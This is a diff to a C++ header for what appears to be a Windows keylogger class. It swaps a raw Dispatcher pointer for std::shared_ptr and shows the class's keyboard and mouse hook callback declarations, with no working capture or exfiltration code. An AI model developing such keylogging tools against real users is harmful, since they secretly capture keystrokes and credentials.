@@ -2,6 +2,7 @@
 # define _KEYLOGGER_HPP_
 
 # include <iostream>
+# include <memory>
 # include <string>
 
 # include "Dispatcher.hpp"
@@ -20,14 +21,14 @@ public:
 	static LRESULT CALLBACK handleKey(int code, WPARAM wParam, LPARAM lParam);
 	static LRESULT CALLBACK handleMouse(int code, WPARAM wParam, LPARAM lParam);
 
-	static void setDispatcher(Dispatcher *disp);
+	static void setDispatcher(std::shared_ptr<Dispatcher> disp);
 private:
 
-	static HINSTANCE	_hInst;
-	static HHOOK		_hook;
-	static bool			_capsLock;
-	static bool			_maj;
-	static Dispatcher	*_disp;
+	static HINSTANCE					_hInst;
+	static HHOOK						_hook;
+	static bool							_capsLock;
+	static bool							_maj;
+	static std::shared_ptr<Dispatcher>	_disp;
 };
 
 #endif
